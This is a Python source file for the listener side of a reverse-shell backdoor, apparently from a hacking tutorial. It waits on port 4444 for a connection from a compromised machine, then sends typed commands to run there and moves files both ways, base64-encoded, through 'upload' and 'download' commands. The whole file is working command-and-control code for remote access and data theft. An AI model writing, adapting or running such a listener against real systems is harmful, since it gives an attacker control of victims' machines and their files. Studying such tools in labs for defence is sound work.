#!/usr/bin/env python
import socket
import subprocess
import json
import base64

def execute_system_command(command):
    return subprocess.run(command, capture_output=True)

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("\n[+] Waiting for incoming connection.\n")
        self.connection, address = listener.accept()
        print("\n[+] Connection accepted\n" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()


    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
    
                result = self.execute_remotely(command)
    
                if command[0] == 'download' and '[-] Error' not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error occured during command execution"


            print(result)




my_listener = Listener("127.0.0.1",4444)
my_listener.run()
